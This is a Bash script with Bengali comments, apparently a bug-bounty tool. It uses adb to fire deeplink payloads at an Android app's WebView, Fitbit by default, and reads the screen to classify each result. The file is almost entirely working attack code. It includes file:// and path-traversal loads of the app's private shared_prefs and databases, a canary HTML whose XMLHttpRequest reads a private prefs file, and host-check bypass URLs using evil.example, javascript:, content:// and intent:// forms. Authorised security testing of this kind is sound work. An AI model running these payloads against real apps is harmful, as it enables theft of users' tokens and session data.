#!/usr/bin/env bash
# mvrp-screen.sh — deeplink/WebView payload sweep, oracle = পর্দার আসল লেখা।
#
# কেন নতুন যন্ত্র (অষ্টম যন্ত্র-ত্রুটির পর):
#   mvrp-payload.sh-এর oracle ছিল logcat-এ 'WebFrameActivity' খোঁজা। কিন্তু
#   BufferQueueProducer প্রতিবার Activity খোলা/বন্ধ হলেই ওই শব্দটা লেখে —
#   URL লোড হয়েছে কিনা তার সাথে সম্পর্ক নেই। ফলে ACCEPT-control আর
#   REJECT-control দুটোই একই রায় দিয়েছে। যে যন্ত্র দুটো জানা-ভিন্ন অবস্থাকে
#   আলাদা করতে পারে না, তার কোনো রায়ের কোনো মূল্য নেই।
#
#   এখানে oracle = uiautomator dump. পর্দায় যা লেখা আছে তা-ই ফেরত আসে:
#   ডিরেক্টরি তালিকার ফাইলনাম, 'net::ERR_ACCESS_DENIED', app-এর নিজের স্ট্রিং।
#
# যন্ত্র-বৈধতা (STAGE 0) — payload চালানোর **আগে** তিনটে হ্যাশ নেওয়া হয়:
#     H0 = HOME পর্দা
#     H1 = জানা-গ্রহণযোগ্য URL
#     H2 = জানা-প্রত্যাখ্যাত URL
#   H1 == H0  -> deeplink রুটই করছে না, বা পর্দা পড়া যাচ্ছে না
#   H1 == H2  -> যন্ত্র গ্রহণ আর প্রত্যাখ্যান আলাদা করতে পারছে না
#   যেকোনোটা হলে exit 2 — কোনো payload চলবে না, কোনো রায় ছাপা হবে না।
#
# ব্যবহার:
#   ./mvrp-screen.sh 'fitbit://webview?url=' com.fitbit.FitbitMobile
#   ACCEPT_URL='https://m.app.example/' ./mvrp-screen.sh '<prefix>' <pkg>
set -uo pipefail

BASE="${1:?ব্যবহার: $0 '<deeplink-prefix-ending-in=>' <package>}"
PKG="${2:?package লাগবে}"
OUT="${MVRP_OUT:-$HOME/mvrp}"
REP="$OUT/screen/$(date +%Y%m%d-%H%M)"; mkdir -p "$REP"
LOG="$REP/report.txt"
WAIT="${WAIT:-6}"
PRIV="/data/data/$PKG"

# control URL: app-এর নিজের host জানা থাকলে সেটাই সেরা accept-control
case "$PKG" in
  *fitbit*)  ACCEPT_URL="${ACCEPT_URL:-https://www.fitbit.com/help}" ;;
  *)         ACCEPT_URL="${ACCEPT_URL:-https://www.google.com/}" ;;
esac
REJECT_URL="${REJECT_URL:-https://example.org/}"

command -v adb >/dev/null || { echo "!! adb নেই"; exit 1; }
adb get-state >/dev/null 2>&1 || { echo "!! device connected নয়"; exit 1; }

# ---------- পর্দা জাগানো, নইলে dump খালি আসে (পাঁচ নম্বর যন্ত্র-ত্রুটি) ----------
adb shell svc power stayon usb >/dev/null 2>&1 </dev/null
adb shell input keyevent KEYCODE_WAKEUP >/dev/null 2>&1 </dev/null

enc() { printf '%s' "$1" | sed 's|%|%25|g; s|:|%3A|g; s|/|%2F|g; s|?|%3F|g; s|&|%26|g; s|#|%23|g; s|=|%3D|g; s| |%20|g'; }

# ---------- oracle ----------
# পর্দার সব দৃশ্যমান লেখা। দুটো পথ: exec-out /dev/tty (দ্রুত), না হলে ফাইল।
screen_text() {
  local x
  x=$(adb exec-out uiautomator dump /dev/tty 2>/dev/null </dev/null | tr -d '\r')
  if ! grep -q '<hierarchy' <<<"$x"; then
    adb shell uiautomator dump /sdcard/mvrp-dump.xml >/dev/null 2>&1 </dev/null
    x=$(adb shell cat /sdcard/mvrp-dump.xml 2>/dev/null </dev/null | tr -d '\r')
  fi
  grep -q '<hierarchy' <<<"$x" || { echo "__DUMP_FAILED__"; return; }
  grep -oE '(text|content-desc)="[^"]*"' <<<"$x" \
    | sed 's/^[a-z-]*="//; s/"$//' | grep -v '^$' | sort -u
}
sig() { sha1sum <<<"$1" | cut -c1-12; }
top_act() {
  adb shell dumpsys activity activities 2>/dev/null </dev/null | tr -d '\r' \
    | grep -oE 'topResumedActivity.*\{[^}]*\}|mResumedActivity.*\{[^}]*\}' | head -1
}

# ---------- fire ----------
# প্রতিবার force-stop: আগের WebView পর্দায় রয়ে গেলে পরের payload-এর রায়
# আগেরটার অবশিষ্টাংশ পড়ে। (এটাই ছিল গণনা-ভিত্তিক control-এর ভুল।)
N=0
fire() {
  local url="$1" name="$2"
  N=$((N+1))
  adb shell am force-stop "$PKG" >/dev/null 2>&1 </dev/null
  adb shell input keyevent KEYCODE_HOME >/dev/null 2>&1 </dev/null
  sleep 1
  adb logcat -c >/dev/null 2>&1 </dev/null
  adb shell am start -a android.intent.action.VIEW -d "'$BASE$(enc "$url")'" \
    >/dev/null 2>&1 </dev/null
  sleep "$WAIT"
  local t; t=$(screen_text)
  printf '%s\n' "$t" > "$REP/$(printf '%02d' $N)-$name.txt"
  adb logcat -d 2>/dev/null </dev/null | grep -iE 'Cannot load|net::ERR|chromium.*CONSOLE' \
    | head -5 > "$REP/$(printf '%02d' $N)-$name.logcat" 2>/dev/null
  printf '%s' "$t"
}

# ---------- শ্রেণিবিভাগ ----------
# শুধু যেগুলো অস্পষ্ট নয় সেগুলোই নাম পায়। বাকি সব = হ্যাশ, control-এর সাথে
# মিলিয়ে পড়তে হবে। "কিছু একটা হয়েছে" কখনো রায় নয়।
classify() {
  local t="$1"
  if   [ "$t" = "__DUMP_FAILED__" ];                      then echo DUMP_FAILED
  elif grep -q 'MVRPREAD-OK' <<<"$t";                     then echo CANARY_READ_PRIVATE
  elif grep -q 'MVRPREAD-FAIL\|MVRPREAD-EX' <<<"$t";      then echo CANARY_READ_BLOCKED
  elif grep -q 'MVRP-CANARY' <<<"$t";                     then echo CANARY_RENDERED
  elif grep -qE '^[A-Za-z0-9_.-]+\.(xml|db|db-journal|json)$' <<<"$t"; then echo FILE_LISTING
  elif grep -qE 'Index of|/data/data/' <<<"$t";           then echo PATH_ON_SCREEN
  elif grep -oE 'net::ERR_[A-Z_]+' <<<"$t" | head -1 | grep -q .; then
       echo "ERR:$(grep -oE 'net::ERR_[A-Z_]+' <<<"$t" | head -1)"
  elif grep -qiE 'Webpage not available|cannot be loaded|Can.t open this page' <<<"$t"; then echo LOAD_REFUSED
  else echo "SCREEN"
  fi
}

{
echo "# mvrp-screen — oracle: uiautomator dump (পর্দার আসল লেখা)"
echo "# base    : $BASE"
echo "# pkg     : $PKG"
echo "# when    : $(date -u +%Y-%m-%dT%H:%M:%SZ)"
echo "# device  : $(adb shell getprop ro.product.model 2>/dev/null | tr -d '\r') / Android $(adb shell getprop ro.build.version.release 2>/dev/null | tr -d '\r')"
echo "# ip      : $(curl -s --max-time 5 ifconfig.me 2>/dev/null || echo n/a)"
echo "# dumps   : $REP/"
echo

# ================= STAGE 0 : যন্ত্র-বৈধতা =================
echo "===== STAGE 0 — যন্ত্র-বৈধতা ====="
adb shell am force-stop "$PKG" >/dev/null 2>&1 </dev/null
adb shell input keyevent KEYCODE_HOME >/dev/null 2>&1 </dev/null; sleep 2
H0T=$(screen_text); H0=$(sig "$H0T")
printf '%s\n' "$H0T" > "$REP/00-home.txt"
echo "HOME        sig=$H0   ($(wc -l <<<"$H0T") লাইন লেখা)"

A1T=$(fire "$ACCEPT_URL" accept-ctl); H1=$(sig "$A1T")
echo "ACCEPT-CTL  sig=$H1   $(classify "$A1T")   $ACCEPT_URL"
echo "            top: $(top_act)"
R2T=$(fire "$REJECT_URL" reject-ctl); H2=$(sig "$R2T")
echo "REJECT-CTL  sig=$H2   $(classify "$R2T")   $REJECT_URL"
echo "            top: $(top_act)"
echo

FAIL=0
if [ "$H0T" = "__DUMP_FAILED__" ] || [ "$A1T" = "__DUMP_FAILED__" ]; then
  echo "!! BROKEN: uiautomator dump কাজ করছে না (পর্দা লক? developer option?)"; FAIL=1
fi
if [ "$H1" = "$H0" ]; then
  echo "!! BROKEN: ACCEPT-CTL পর্দা HOME-এর সমান — deeplink রুটই করছে না।"
  echo "   যাচাই করো:  adb shell dumpsys package $PKG | grep -A3 'android.intent.action.VIEW'"
  FAIL=1
fi
if [ "$H1" = "$H2" ]; then
  echo "!! NOT DISCRIMINATING: accept আর reject একই পর্দা দিচ্ছে।"
  echo "   diff দেখো: diff $REP/01-accept-ctl.txt $REP/02-reject-ctl.txt"
  FAIL=1
fi
if [ "$FAIL" -eq 1 ]; then
  echo
  echo "===== থামলাম। যন্ত্র বৈধ নয়, তাই কোনো payload চালানো হলো না। ====="
  echo "ফল: অনিষ্পন্ন (inconclusive), নেতিবাচক নয়। এটাই নথিতে লেখো।"
  exit 2
fi
echo "VALIDATED   H0/H1/H2 তিনটে আলাদা — যন্ত্র গ্রহণ ও প্রত্যাখ্যান আলাদা করতে পারে।"
echo

# ================= STAGE 1 : file:// নাগাল =================
echo "===== STAGE 1 — file:// দিয়ে app-এর ব্যক্তিগত ডিরেক্টরি ====="
# decompile করা সোর্স থাকলে আসল prefs-ফাইলের নাম বের করো — অনুমান নয়।
PREFS=()
SRCD="$OUT/src/$PKG/sources"
if [ -d "$SRCD" ]; then
  mapfile -t PREFS < <(grep -rhoE 'getSharedPreferences\("[^"]+"' "$SRCD" 2>/dev/null \
    | sed 's/.*("//; s/"$//' | sort -u | head -6)
  echo "# সোর্স থেকে পাওয়া prefs নাম: ${PREFS[*]:-(কিছু নেই)}"
fi

S1=( "file://$PRIV/shared_prefs/" "file://$PRIV/databases/" "file://$PRIV/files/"
     "file:///android_asset/../../../..$PRIV/shared_prefs/"
     "file:///proc/self/cmdline" "file:///etc/hosts" )
for p in "${PREFS[@]}"; do [ -n "$p" ] && S1+=( "file://$PRIV/shared_prefs/$p.xml" ); done

FILE_OK=0
for p in "${S1[@]}"; do
  t=$(fire "$p" "s1"); v=$(classify "$t")
  printf '%-22s %s\n' "$v" "$p"
  case "$v" in FILE_LISTING|PATH_ON_SCREEN) FILE_OK=1
    grep -E '\.(xml|db|json)$' <<<"$t" | head -6 | sed 's/^/                       /' ;;
  esac
  [ "$(sig "$t")" = "$H2" ] && echo "                       (= REJECT-CTL পর্দা)"
done
echo

# ================= STAGE 2 : canary — আসল theft primitive =================
# file:// লোড হলেই থামা যায় না। আসল প্রশ্ন: file:// পাতা কি **অন্য**
# file:// পড়তে পারে? setAllowFileAccessFromFileURLs / Universal... true হলে
# একটা sdcard-এর HTML app-এর টোকেন পড়ে ফেলতে পারে = Theft of Sensitive Data.
# canary নিজের পর্দাতেই ফল লেখে, নেটওয়ার্কে কিছু পাঠায় না।
echo "===== STAGE 2 — file:// থেকে file:// (universal file access) ====="
TARGET="$PRIV/shared_prefs/"
[ "${#PREFS[@]}" -gt 0 ] && [ -n "${PREFS[0]:-}" ] && TARGET="$PRIV/shared_prefs/${PREFS[0]}.xml"
CAN=$(mktemp /tmp/mvrp-canary-XXXX.html)
cat > "$CAN" <<HTML
<html><body><h1>MVRP-CANARY</h1><div id="o">MVRPREAD-INIT</div>
<script>
var t="file://$TARGET";
function s(m){document.getElementById("o").textContent=m;document.title=m;}
try{
  var x=new XMLHttpRequest();
  x.onload=function(){s("MVRPREAD-OK "+String(x.responseText).substring(0,160));};
  x.onerror=function(){s("MVRPREAD-FAIL onerror");};
  x.open("GET",t); x.send();
}catch(e){ s("MVRPREAD-EX "+e); }
</script></body></html>
HTML
adb push "$CAN" /sdcard/mvrp-canary.html >/dev/null 2>&1 </dev/null \
  && echo "# canary পাঠানো হয়েছে, লক্ষ্য: $TARGET" \
  || echo "!! canary push ব্যর্থ"
t=$(fire "file:///sdcard/mvrp-canary.html" "canary"); v=$(classify "$t")
printf '%-22s %s\n' "$v" "file:///sdcard/mvrp-canary.html"
grep -i 'MVRPREAD' <<<"$t" | head -3 | sed 's/^/                       /'
case "$v" in
  CANARY_READ_PRIVATE) echo "                       *** app-এর ব্যক্তিগত ফাইল একটা বাইরের HTML পড়েছে।" ;;
  CANARY_RENDERED|CANARY_READ_BLOCKED) echo "                       (canary রেন্ডার হয়েছে — তাই FAIL মানে সত্যিই ব্লকড, যন্ত্র-ত্রুটি নয়)" ;;
  *) echo "                       (canary রেন্ডারই হয়নি -> file:// বন্ধ। এই ধাপ অনিষ্পন্ন।)" ;;
esac
rm -f "$CAN"
echo

# ================= STAGE 3 : host-যাচাই বাইপাস =================
# endsWith / contains / startsWith দিয়ে host মেলালে এগুলোর একটা পার হয়।
echo "===== STAGE 3 — host-যাচাই বাইপাস ====="
H=$(sed 's|^https\?://||; s|/.*||' <<<"$ACCEPT_URL")
S3=( "https://$H.evil.example/" "https://evil$H/" "https://$H@example.org/"
     "https://$H%2f@example.org/" "https://$H../" "https://$H.example.org/"
     "https://example.org/?x=https://$H/" "https://example.org/#$H"
     "//example.org/" "https:/\\example.org/" "https://example.org\\@$H/"
     "javascript:document.title='MVRP-JS'"
     "content://$PKG.fileprovider/root/sdcard/mvrp-canary.html"
     "intent://x/#Intent;scheme=http;package=$PKG;end" )
for p in "${S3[@]}"; do
  t=$(fire "$p" "s3"); v=$(classify "$t"); s=$(sig "$t")
  tag=""
  [ "$s" = "$H1" ] && tag="  <= ACCEPT-CTL পর্দার সমান (গ্রহণ হয়েছে)"
  [ "$s" = "$H2" ] && tag="  (= REJECT-CTL)"
  grep -q 'MVRP-JS' <<<"$t" && tag="  <= javascript: চলেছে"
  printf '%-22s %-46s sig=%s%s\n' "$v" "$p" "$s" "$tag"
done

cat <<'NOTE'

===== পড়ার নিয়ম =====
CANARY_READ_PRIVATE  একটা বাইরের HTML app-এর ব্যক্তিগত ফাইল পড়েছে।
                     পর্দার লেখায় ফাইলের বিষয়বস্তু আছে। token/session থাকলে
                     Theft of Sensitive Data — দৃশ্য ৩, Tier অনুযায়ী $4,500+।
FILE_LISTING         ব্যক্তিগত ডিরেক্টরির ফাইলনাম পর্দায়। এটা **precondition**,
                     crossing নয় (CLAUDE.md 2.6)। পরের ধাপ: নির্দিষ্ট ফাইল পড়া।
"<= ACCEPT-CTL সমান" ওই URL app গ্রহণ করেছে। বাইরের host হলে host-যাচাই
                     বাইপাস — তখন প্রশ্ন: ভেতরে JS bridge বা token আছে কি?
ERR:net::ERR_*       WebView নিজে আটকেছে। ACCESS_DENIED = file access বন্ধ।
SCREEN               নামহীন। sig মিলিয়ে পড়ো, নয়তো অনিষ্পন্ন।
DUMP_FAILED          পর্দা পড়া যায়নি — ওই মাপটা বাতিল, নেতিবাচক নয়।

প্রতিটা payload-এর পুরো পর্দার লেখা আর logcat আলাদা ফাইলে আছে ($REP/)।
রিপোর্ট লেখার সময় ওই ফাইলই verbatim প্রমাণ (CLAUDE.md 9.8)।
NOTE
} 2>&1 | tee "$LOG"

echo
echo "রিপোর্ট: $LOG"
echo "সব dump: $REP/"
